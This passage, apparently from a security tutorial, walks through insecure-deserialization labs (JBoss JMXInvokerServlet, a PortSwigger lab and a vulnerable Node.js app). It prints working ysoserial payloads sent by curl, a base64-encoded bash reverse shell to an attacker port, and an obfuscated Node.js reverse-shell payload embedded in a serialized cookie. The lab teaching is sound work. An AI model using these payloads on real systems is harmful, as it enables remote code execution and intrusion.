   <parameter>http://${hostforurl}:${port}/invoker/JMXInvokerServlet</parameter>
</value-factory>
```

- In this way, we can map the URL endpoint with the source code. Now let's get back to our insecure deserialization vulnerability.
- Inorder to exploit it we need to locate the gadget, craft the exploit payload and submit the payload to the target application.
- We will be using ysoserial to craft the payload. It is a tool that allows us to generated malicious serialized object.
- Download the ysoserial JAR file from [here.](https://github.com/frohoff/ysoserial/releases/tag/v0.0.6)

```bash
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

- Generate the payload and send it's output through CURL command to the endpoint.

```bash
java -jar ysoserial-all.jar CommonsCollections1 "touch /tmp/nirajkharel" | curl -X POST --data-binary @- http://YOUR-IP:8080/invoker/JMXInvokerServlet
```

- Here `@-` is used to pass the value of yoserial  and `--data-binary` is used since binary object is passed on the request.
- If successfull, there will be a file called `nirajkharel` under `/tmp` directory.

```bash
docker ps -a
docker exec -it <Container-ID> /bin/bash
cd /tmp
ls
hsperfdata_root  ks-script-V_wEqJ  nirajkharel  yum.log
```

- To get a reverse shell, we can craft the payload as below
```bash
export PAYLOAD=$(echo "bash -i >& /dev/tcp/YOUR-IP/1337 0>&1" | base64)
echo $PAYLOAD
# Listen to an attacker port
nc -lvnp 1337
java -jar ysoserial-all.jar CommonsCollections1 "/bin/bash -c {/bin/echo,$PAYLOAD}|{/usr/bin/base64,-d}|{/bin/bash,-i}" | curl -X POST --data-binary @- http://YOUR-IP:8080/invoker/JMXInvokerServlet
```
- You will have a reverse shell gained in your netcat listener.


**Lab: Exploiting Java deserialization with Apache Commons**
Let's take an another lab example for Java Insecure Deserialization. We can access this lab from [PortSwigger Academy.](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
- As usual, navigate into above link and login using your portswigger account.
- Click on Access the lab, here the goal is to use a third-party tool to generate a malicious serialized object containing a remote code execution payload and delete the morale.txt file from Carlo's home directory.
- Navigate to My Account section and login with credentials **wiener:peter**.
- If we intercept the request after login, we can see the session cookie on the request.
![image](https://user-images.githubusercontent.com/47778874/228304320-e33bd933-17d8-4e5f-ad26-054a4cc08338.png)

- The session cookie seems to have a different format then that we have exploited during PHP Insecure Deserialization lab. The cookie contains **rO0AB** headers on it which determines that it is the Base64 encoded Java Serialized object as discussed on previous lab.
- As the lab requires third party tool to generate the malicious payload, let's use ysoserial.

    ```bash
    wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
    java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
    ```
- Here we used the gadget as **CommonCollections4**. How did I know it? Tried with **CommonsCollections1**, **CommonsCollections2** and so on.
- Replace the output with session cookie on the repeater and send the request.
![image](https://user-images.githubusercontent.com/47778874/228308291-8fd6a26c-10ac-41d9-ac3c-96acf71e5865.png)

- The file morale.txt will be deleted and lab is solved.
![image](https://user-images.githubusercontent.com/47778874/228307783-8242c6c2-eb12-49fd-8210-f4bf0578ba6d.png)

### Deserialization on Node JS
- Serialization is usually performed on Node JS using a module called [node-serialize.](https://www.npmjs.com/package/node-serialize). This module contains an **eval()** function and can be exploited if the data passed is not validated properly. If we view the source code of the module **node-serialize**, we can find that it contains **eval()** functions on line 76 as shown below.

```js
if(obj[key].indexOf(FUNCFLAG) === 0) {
    obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
```

- Before its exploitation, let's talk about how serialization works on Node JS. We need to install the module **node-serialize** for it using `npm install node-serialize` command.

```js
var nodeSerialize = require("node-serialize")

var obj = {
  name: 'Bob',
  say: function() {
    return 'hi ' + this.name;
  }
};

var objS = nodeSerialize.serialize(obj);
console.log(objS)
```

- Run the code using `node` command

```bash
node nodedemo.js 
{"name":"Bob","say":"_$$ND_FUNC$$_function() {\n    return 'hi ' + this.name;\n  }"}
```

- In the above code, **obj** object has two properties: **name**, which is set to the string **Bob**, and **say**, which is a function that returns the string **hi** followed by the value of the **name** property. The **node-serialize** library is then used to serialize the **obj** object.
- How this can be vulnerable?
- Let's copy the same code and make some changes here.

```js
var nodeSerialize = require("node-serialize")

var obj = {
  name: 'Bob',
  say: function(){
require('child_process').exec('ls -la', function(error, stdout, stderr) { console.log(stdout) });
}(),
};

var objS = nodeSerialize.serialize(obj);
console.log(objS)
```

- Here, I just told an application to execute the system commands and list down the files and folders within the directory, since the module **node-serialize** uses **eval()** function within it, it should execute the command.

```bash
node nodedemo1.js
{"name":"Bob"}
total 12
drwxr-xr-x 2 niraj niraj 4096 Mar 28 23:15 .
drwxr-xr-x 5 niraj niraj 4096 Mar 28 23:14 ..
-rw-r--r-- 1 niraj niraj    0 Mar 28 23:15 config.html
-rw-r--r-- 1 niraj niraj    0 Mar 28 23:15 maybecreds.xml
-rw-r--r-- 1 niraj niraj  259 Mar 28 23:14 nodegemo.js
-rw-r--r-- 1 niraj niraj    0 Mar 28 23:14 test.txt
```

- What if there is an application which accepts user inputs or sessions as serialized object and deserialize it using the module **node-serialize**? There might be a potential command execution on it.
- There is a simple vulnerable lab developed by `SaneenKP` for Node JS. [Clone the respository.](https://github.com/SaneenKP/Insecure-Deserialization)

```bash
git clone https://github.com/SaneenKP/Insecure-Deserialization
cd Insecure-Deserialization
ls
app.js  log.js  node_modules  package.json  package-lock.json  README.md
```

- Remove the file log.js to avoid spoilers.
- Let's analyze the source code `app.js` first.

```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {

 if (req.cookies.profile) {
   
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str , (err) => {
       if(err){
           console.log(err)
       }
   });
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6InNhbmVlbiIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJlcm5ha3VsYW0ifQ==", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
console.log("Listening on port 3000...");
```

- Here we can find that the application listens on port 3000 and when `/` endpoint is navigated, a function is triggered, it checks whether the application has cookies as a profile parameter or not, if not if sets the hardcoded cookies and if yes it deserializes the base64 encoded cookie value and then use **node-serialize.unserialize()** to deserialize it.
- Let's run the application and navigate YOUR-IP:3000 on a browser. `node app.js`
![image](https://user-images.githubusercontent.com/47778874/228322848-b0df4e61-c44a-49d3-bc0f-2bb5f1c1befa.png)
- Intercept the request in burp and refresh the web page again, we can find a profile cookie assigned.
![image](https://user-images.githubusercontent.com/47778874/228442103-ecfcd36f-e38f-4f46-abc4-23c1c529b2f2.png)

- Since the application is using vulnerable module to perform the deserialization, there is possible chance of code execution. We need to use a reverse shell generation for NodeJS called [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

```bash
wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
python2 nodejsshell.py YOUR-IP 1337
```

- The result would be

```js
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,56,57,46,49,56,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```
- Our payload is ready, now we need to insert it into our serialized object.

```js
var serialize = require('node-serialize');
x = {
profile : function(){
  require('child_process').execSync("echo test", function puts(error, stdout, stderr) {});
}
};
console.log("Serialized: \n" + serialize.serialize(x));
```

- Save it as exploit.js and run it to create a serialized object

```js
node exploit.js
{"profile":"_$$ND_FUNC$$_function(){\n  require('child_process').execSync(\"echo test\", function puts(error, stdout, stderr) {});\n}"}
```

- Now we need to replace **echo test with the payload generated above** which makes our serialized object as.

```js
{"profile":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,56,57,46,49,56,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

- To invoke the function automatically, we need to append () at the last.
- Now enccode the above object with Base64 encoder.
![image](https://user-images.githubusercontent.com/47778874/228444352-b8ce0319-07be-4fbb-ab86-ca20713c2030.png)
- Listen to the port `1337` on your machine and replace the encoded object on sessio cookie.
![image](https://user-images.githubusercontent.com/47778874/228444703-bd84f948-821f-4a0a-b033-a7cb4b4b9f6c.png)
![image](https://user-images.githubusercontent.com/47778874/228444775-0f473d4e-f5cc-4349-b662-4c93c2611af0.png)
